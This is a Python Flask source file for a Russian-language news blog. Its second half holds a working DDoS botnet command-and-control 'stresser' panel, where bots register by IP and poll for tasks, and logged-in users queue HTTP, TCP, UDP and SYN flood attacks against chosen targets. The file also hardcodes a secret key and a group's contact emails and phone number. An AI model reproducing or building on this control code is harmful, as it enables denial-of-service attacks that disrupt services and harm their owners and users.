from flask import Flask, request, url_for, render_template, abort
from flask import json, redirect, make_response, session, flash
from forms.user import RegisterForm
from forms.user import LoginForm
from data import db_session
from data.users import User
from data.news import News
from data.feedback import Feedback
from forms.news import NewsForm
from forms.feedback import FeedbackForm
from flask_login import LoginManager, login_user, login_required, logout_user
from flask_login import current_user
import datetime
import json
import threading, time, socket, random


app = Flask(__name__)
app.config['SECRET_KEY'] = 'nbphackers_secret_key_A8HFGEWUY1SD35FG'
app.config['PERMANENT_SESSION_LIFETIME'] = datetime.timedelta(
    days=7)

login_manager = LoginManager()
login_manager.init_app(app)


@login_manager.user_loader
def load_user(user_id):
    db_sess = db_session.create_session()
    return db_sess.query(User).get(user_id)


@app.route("/")
def index():
    db_sess = db_session.create_session()
    news = db_sess.query(News).filter(News.is_private != True)
    return render_template("news.html", news=news)


@app.route("/contacts")
def contacts():
    email = 'nbphackers@proton.me'
    email2 = 'nbphackers@mail.ru'
    phnum = '+79176661488'
    return render_template("contacts.html", email=email, email2=email2, phnum=phnum)


@app.route("/news")
def news():
    db_sess = db_session.create_session()
    if current_user.is_authenticated:
        news = db_sess.query(News).filter(
            (News.user == current_user) | (News.is_private != True))
    else:
        news = db_sess.query(News).filter(News.is_private != True)
    return render_template("news.html", news=news)


@app.route('/admin',  methods=['GET', 'POST'])
@login_required
def admin():
    form = NewsForm()
    if form.validate_on_submit():
        db_sess = db_session.create_session()
        news = News()
        news.title = form.title.data
        news.content = form.content.data
        news.is_private = form.is_private.data
        current_user.news.append(news)
        db_sess.merge(current_user)
        db_sess.commit()
        return redirect('/')
    return render_template('admin.html', title='Админка', form=form)


@app.route('/news/<int:id>', methods=['GET', 'POST'])
@login_required
def edit_news(id):
    form = NewsForm()
    if request.method == "GET":
        db_sess = db_session.create_session()
        news = db_sess.query(News).filter(News.id == id,
                                          News.user == current_user
                                          ).first()
        if news:
            form.title.data = news.title
            form.content.data = news.content
            form.is_private.data = news.is_private
        else:
            abort(404)
    if form.validate_on_submit():
        db_sess = db_session.create_session()
        news = db_sess.query(News).filter(News.id == id,
                                          News.user == current_user
                                          ).first()
        if news:
            news.title = form.title.data
            news.content = form.content.data
            news.is_private = form.is_private.data
            db_sess.commit()
            return redirect('/')
        else:
            abort(404)
    return render_template('news.html', title='Редактирование новости', form=form)


@app.route('/news_delete/<int:id>', methods=['GET', 'POST'])
@login_required
def news_delete(id):
    db_sess = db_session.create_session()
    news = db_sess.query(News).filter(News.id == id, News.user == current_user).first()
    if news:
        db_sess.delete(news)
        db_sess.commit()
    else:
        abort(404)
    return redirect('/')


@app.route('/login', methods=['GET', 'POST'])
def login():
    form = LoginForm()
    if form.validate_on_submit():
        db_sess = db_session.create_session()
        user = db_sess.query(User).filter(User.email == form.email.data).first()
        if user and user.check_password(form.password.data):
            login_user(user, remember=form.remember_me.data)
            return redirect("/")
        return render_template('login.html',
                               message="Неправильный логин или пароль",
                               form=form)
    return render_template('login.html', title='Авторизация', form=form)


@app.route('/logout')
@login_required
def logout():
    logout_user()
    return redirect("/")


@app.route('/register', methods=['GET', 'POST'])
def register():
    form = RegisterForm()
    if form.validate_on_submit():
        if form.password.data != form.password_again.data:
            return render_template('register.html', title='Регистрация',
                                   form=form,
                                   message="Пароли не совпадают")
        db_sess = db_session.create_session()
        if db_sess.query(User).filter(User.email == form.email.data).first():
            return render_template('register.html', title='Регистрация',
                                   form=form,
                                   message="Такой пользователь уже есть")
        user = User(name=form.name.data, email=form.email.data)
        user.set_password(form.password.data)
        db_sess.add(user)
        db_sess.commit()
        return redirect('/login')
    return render_template('register.html', title='Регистрация', form=form)


@app.route("/cookie_test")
def cookie_test():
    visits_count = int(request.cookies.get("visits_count", 0))
    if visits_count:
        res = make_response(
            f"Вы пришли на эту страницу {visits_count + 1} раз")
        res.set_cookie("visits_count", str(visits_count + 1),
                       max_age=60 * 60 * 24 * 365 * 2)
    else:
        res = make_response(
            "Вы пришли на эту страницу в первый раз за последние 2 года")
        res.set_cookie("visits_count", '1',
                       max_age=60 * 60 * 24 * 365 * 2)
    return res


@app.route("/session_test")
def session_test():
    visits_count = session.get('visits_count', 0)
    session['visits_count'] = visits_count + 1
    return make_response(
        f"Вы пришли на эту страницу {visits_count + 1} раз")


@app.route('/feedback', methods=['GET', 'POST'])
def feedback():
    form = FeedbackForm()
    if form.validate_on_submit():
        db_sess = db_session.create_session()
        question = Feedback()
        question.title = form.email.data
        question.content = form.content.data
        question.name = form.name.data
        db_sess.add(question)
        db_sess.commit()
        return redirect('/feedback')
    return render_template('feedback.html', title='Задать вопрос', form=form)


@app.route('/upload', methods=['POST', 'GET'])
def upload():
    if request.method == 'GET':
        return render_template('upload.html')
    elif request.method == 'POST':
        f = request.files['file']
        print(f.read())
        return "Файл отправлен"


bots = []
tasks = {}

methods = {
    "HTTP":"l7",
    "TCP":"l4",
    "UDP":"l4",
    "SYN":"l4",
    "HTTP-RAW":"l7"
}


def sleep(times):
    for i in range(times):
        time.sleep(1)
        yield i


def isForm(form, key):
    try: return form[key]
    except: return False


def check(time, key):
    iss = True
    for i in sleep(int(time)):
        if isForm(tasks, key) == False:
            iss = False
            break
    if iss: tasks.pop(key)


@app.route("/stresser")
def stresser():
    db_sess = db_session.create_session()
    if current_user.is_authenticated:
        target = ""
        if len(list(tasks.keys())) != 0: target = "TARGET:"
        return render_template("target.html", count=str(len(bots)), target=target, tasks=list(tasks.values()))
    else:
        return redirect("/login")


@app.route("/RegistrBot")
def RegistrBot():
    if (request.remote_addr in bots) != True:
        bots.append(request.remote_addr)
    return ""


@app.route("/GetTask")
def getTask():
    if (request.remote_addr in bots) != True:
        bots.append(request.remote_addr)
    return json.dumps(tasks)


@app.route("/AddTask", methods=["POST"])
def addTask():
    if current_user.is_authenticated:
        Err, form = [], request.form
        forms = {"target": "Пустое поле Target.", "method": "Пустое поле Method.", "timess": "Пустое поле Time."}
        for i in list(forms.keys()):
            stats = isForm(form, i)
            if stats == False: Err.append(forms[i])
            if stats != False and form[i] == "": Err.append(forms[i])
            if stats != False and methods[form["method"]] == "l4" and (
                    ("https://" or "http://") in form["target"]) != False:
                Err.append("Этот Target для L7")
            if stats != False and methods[form["method"]] == "l4":
                try:
                    print(32243)
                    addr, port = form["target"].split(":")[0], int(form["target"].split(":")[1])
                    socket.inet_aton(addr)
                except:
                    Err.append("Неверная цель")
                try:
                    int(form["timess"])
                except:
                    Err.append("Неверно указано поле Time")

        try:
            assert form["method"] in list(methods.keys())
        except:
            Err.append("Метода не существует")

        if len(Err) != 0:
            return f"{Err[0]}<br><br><a href=\"/stresser\">Назад</a>"
        else:
            key = str(random.getrandbits(30))
            tasks[key] = {"status": "_", "target": form["target"], "time": form["timess"],
                          "type": form["method"].lower(), "id": key}
            threading.Thread(target=check, args=(form["timess"], key)).start()
            return redirect("/stresser")
    else:
        return redirect("/login")


@app.route("/DelTask/<string:targets>")
def delTask(targets):
    try:
        tasks.pop(targets)
    except:
        pass
    return redirect("/stresser")


def main():
    db_session.global_init("db/blogs.sqlite")
    user = User()
    db_sess = db_session.create_session()

    '''db_sess.query(News).filter(News.id >= 1).delete()
    db_sess.commit()'''

    app.run(port=8080, host='127.0.0.1')


if __name__ == '__main__':
    main()
